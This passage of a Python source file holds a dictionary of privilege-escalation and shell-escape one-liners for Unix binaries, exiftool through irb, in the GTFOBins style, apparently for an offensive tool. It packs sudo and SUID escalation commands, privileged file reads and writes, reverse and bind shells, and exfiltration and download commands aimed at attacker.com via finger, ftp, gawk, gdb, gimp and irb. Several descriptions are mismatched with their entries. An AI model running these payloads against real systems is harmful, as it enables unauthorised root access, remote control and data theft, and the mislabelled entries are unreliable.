            'exploits':{
                '1':"LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT"}},
            },
    'expand':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which expand) .\n\nLFILE=file_to_read\n./expand \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo expand \"$LFILE\""}},
            },
    'expect':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"expect -c 'spawn /bin/sh;interact'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nexpect $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which expect) .\n\n./expect -c 'spawn /bin/sh -p;interact'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo expect -c 'spawn /bin/sh;interact'"}},
            },
    'facter':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter"}},
            },
    'file':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nfile -f $LFILE",
                '2':"LFILE=file_to_read\nfile -m $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which file) .\n\nLFILE=file_to_read\n./file -f $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo file -f $LFILE"}},
            },
    'find':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"find . -exec /bin/sh \; -quit"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which find) .\n\n./find . -exec /bin/sh -p \; -quit"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo find . -exec /bin/sh \; -quit"}},
            },
    'finger':{
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\""}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\""}},
            },
    'flock':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"flock -u / /bin/sh"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which flock) .\n\n./flock -u / /bin/sh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo flock -u / /bin/sh"}},
            },
    'fmt':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"",
                '2':"LFILE=file_to_read\nfmt -999 \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which fmt) .\n\nLFILE=file_to_read\n./fmt -999 \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo fmt -999 \"$LFILE\""}},
            },
    'fold':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nfold -w99999999 \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which fold) .\n\nLFILE=file_to_read\n./fold -w99999999 \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\""}},
            },
    'ftp':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ftp\n!/bin/sh"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"RHOST=attacker.com\nftp $RHOST\nput file_to_send"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"RHOST=attacker.com\nftp $RHOST\nget file_to_get"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ftp\n!/bin/sh"}},
            },
    'gawk':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"gawk 'BEGIN {system(\"/bin/sh\")}'"}},
        'non_interactive_reverse':{
            'info':'It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n\ts = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n\twhile (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n\twhile (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"}},
        'non_interactive_bind':{
            'info':'It can bind a non-interactive shell to a local port to allow remote network access.',
            'exploits':{
                '1':"LPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN {\n\ts = \"/inet/tcp/\" LPORT \"/0/0\";\n\twhile (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n\twhile (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ngawk '//' \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which gawk) .\n\nLFILE=file_to_read\n./gawk '//' \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo gawk 'BEGIN {system(\"/bin/sh\")}'"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which gawk) .\n\n./gawk 'BEGIN {system(\"/bin/sh\")}'"}}
            },
    'gcc':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"gcc -wrapper /bin/sh,-s ."}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE"}},
        'file_read':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"LFILE=file_to_read\ngcc -x c -E \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo gcc -wrapper /bin/sh,-s ."}},
            },
    'gdb':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"gdb -nx -ex '!sh' -ex quit"}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\ngdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' -ex quit"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export URL=http://attacker.com/\nexport LFILE=file_to_send\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' -ex quit",
                '2':"export LPORT=8888\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngdb -nx -ex 'python import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \"DATA\"\" -ex quit"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"gdb -nx -ex 'python print(open(\"file_to_read\").read())' -ex quit"}},
        'library_load':{
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which gdb) .\n\n./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo gdb -nx -ex '!sh' -ex quit"}},
        'capabilities':{
            'info':'This requires that GDB is compiled with Python support.',
            'exploits':{
                '1':"cp $(which gdb) .\nsudo setcap cap_setuid+ep gdb\n\n./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"}}
            },
    'gem':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"gem open -e \"/bin/sh -c /bin/sh\" rdoc",
                '2':"gem open rdoc\n:!/bin/sh",
                '3':"TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x",
                '4':"TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"}},
            },
    'genisoimage':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ngenisoimage -q -o - \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\""}},
            },
    'ghc':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ghc -e 'System.Process.callCommand \"/bin/sh\"'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"}},
            },
    'ghci':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ghci\nSystem.Process.callCommand \"/bin/sh\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ghci\nSystem.Process.callCommand \"/bin/sh\""}},
            },
    'gimp':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'",
                '2':"export LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'"}},
        'library_load':{
            'info':'It loads shared libraries that may be used to run code in the binary execution context.',
            'exploits':{
                '1':"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which gimp) .\n\n./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"}},
            },
    'git':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"PAGER='sh -c \"exec sh 0<&1\"' git -p help",
                '2':"git help config\n!/bin/sh",
                '3':"git branch --help config\n!/bin/sh",
                '4':"TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\ngit -C \"$TF\" commit --allow-empty -m x"}},
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ngit diff /dev/null $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
                '2':"sudo git -p help config\n!/bin/sh",
                '3':"sudo git branch --help config\n!/bin/sh",
                '4':"TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x",
                '5':"TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which git) .\n\nPAGER='sh -c \"exec sh 0<&1\"' ./git -p help"}},
            },
    'grep':{
        'file_read':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"LFILE=file_to_read\ngrep '' $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which grep) .\n\nLFILE=file_to_read\n./grep '' $LFILE"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo grep '' $LFILE"}},
            },
    'gtester':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF"}},
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\ngtester \"DATA\" -o $LFILE"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which gtester) .\n\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF"}},
            },
    'gzip':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\ngzip -f $LFILE -t",
                '2':"LFILE=file_to_read\ngzip -c $LFILE | gzip -d"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which gzip) .\n\nLFILE=file_to_read\n./gzip -f $LFILE -t"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo gzip -f $LFILE -t"}},
            },
    'hd':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nhd \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which hd) .\n\nLFILE=file_to_read\n./hd \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo hd \"$LFILE\""}},
            },
    'head':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nhead -c1G \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which head) .\n\nLFILE=file_to_read\n./head -c1G \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo head -c1G \"$LFILE\""}},
            },
    'hexdump':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nhexdump -C \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which hexdump) .\n\nLFILE=file_to_read\n./hexdump -C \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo hexdump -C \"$LFILE\""}},
            },
    'highlight':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nhighlight --no-doc --failsafe \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which highlight) .\n\nLFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\""}},
            },
    'hping3':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"hping3\n/bin/sh"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which hping3) .\n\n./hping3\n/bin/sh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo hping3\n/bin/sh"}},
            },
    'iconv':{
        'file_write':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_write\necho \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"$LFILE\""}},
        'file_read':{
            'info':'It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which iconv) .\n\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""}},
            },
    'iftop':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"iftop\n!/bin/sh"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo iftop\n!/bin/sh"}},
        'limited_suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which iftop) .\n\n./iftop\n!/bin/sh"}},
            },
    'install':{
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which install) .\n\nLFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF"}},
            },
    'ionice':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"ionice /bin/sh"}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which ionice) .\n\n./ionice /bin/sh -p"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"sudo ionice /bin/sh"}},
            },
    'ip':{
        'file_read':{
            'info':'It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.',
            'exploits':{
                '1':"LFILE=file_to_read\nip -force -batch \"$LFILE\""}},
        'suid':{
            'info':'This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.',
            'exploits':{
                '1':"sudo install -m =xs $(which ip) .\n\nLFILE=file_to_read\n./ip -force -batch \"$LFILE\"",
                '2':"sudo install -m =xs $(which ip) .\n\n./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo"}},
        'sudo':{
            'info':'If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.',
            'exploits':{
                '1':"LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"",
                '2':"sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo"}},
            },
    'irb':{
        'shell':{
            'info':'It can be used to break out from restricted environments by spawning an interactive system shell.',
            'exploits':{
                '1':"irb\nexec '/bin/bash'"}},
        'reverse_shell':{
            'info':'It can send back a reverse shell to a listening attacker to open a remote network access.',
            'exploits':{
                '1':"export RHOST='127.0.0.1'\nexport RPORT=9000\nirb\nrequire 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end"}},
        'file_upload':{
            'info':'It can exfiltrate files on the network.',
            'exploits':{
                '1':"irb\nrequire 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;"}},
        'file_download':{
            'info':'It can download remote files.',
            'exploits':{
                '1':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nirb\nrequire 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])"}},
        'file_write':{
